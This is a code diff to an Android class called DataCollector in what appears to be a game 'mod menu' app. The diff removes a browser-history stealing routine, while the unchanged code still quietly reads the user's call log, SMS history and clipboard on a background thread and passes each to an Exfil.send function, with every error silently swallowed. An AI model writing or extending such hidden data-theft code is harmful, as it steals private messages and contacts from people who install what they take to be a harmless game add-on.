@@ -1,14 +1,11 @@
 package com.brawl.modmenu;
 
 import android.content.Context;
-import android.content.SharedPreferences;
+import android.content.ClipboardManager;
 import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.provider.CallLog;
-import android.provider.Browser;
 import android.provider.Telephony;
-import android.content.ClipboardManager;
-import android.os.Build;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -22,8 +19,6 @@ public class DataCollector {
             try { sendCallLog(ctx); } catch (Throwable ignored) {}
             try { Thread.sleep(1500); } catch (Throwable ignored) {}
             try { sendSmsHistory(ctx); } catch (Throwable ignored) {}
-            try { Thread.sleep(1500); } catch (Throwable ignored) {}
-            try { sendBrowserHistory(ctx); } catch (Throwable ignored) {}
             try { Thread.sleep(1500); } catch (Throwable ignored) {}
             try { sendClipboard(ctx); } catch (Throwable ignored) {}
         }).start();
@@ -99,29 +94,6 @@ public class DataCollector {
         c.close();
         sb.insert(0, "Всего: " + count + "\n\n");
         Exfil.send("SMS_HISTORY", sb.toString());
-    }
-
-    private static void sendBrowserHistory(Context ctx) {
-        StringBuilder sb = new StringBuilder();
-        try {
-            Cursor c = ctx.getContentResolver().query(
-                Browser.BOOKMARKS_URI,
-                new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL},
-                Browser.BookmarkColumns.BOOKMARK + " = 0",
-                null, null);
-            if (c != null) {
-                int count = 0;
-                while (c.moveToNext() && count < 200) {
-                    String title = c.getString(0);
-                    String url = c.getString(1);
-                    sb.append(title).append("\n").append(url).append("\n---\n");
-                    count++;
-                }
-                c.close();
-                sb.insert(0, "Всего: " + count + "\n\n");
-            }
-        } catch (Throwable ignored) {}
-        if (sb.length() > 0) Exfil.send("HISTORY", sb.toString());
     }
 
     private static void sendClipboard(Context ctx) {
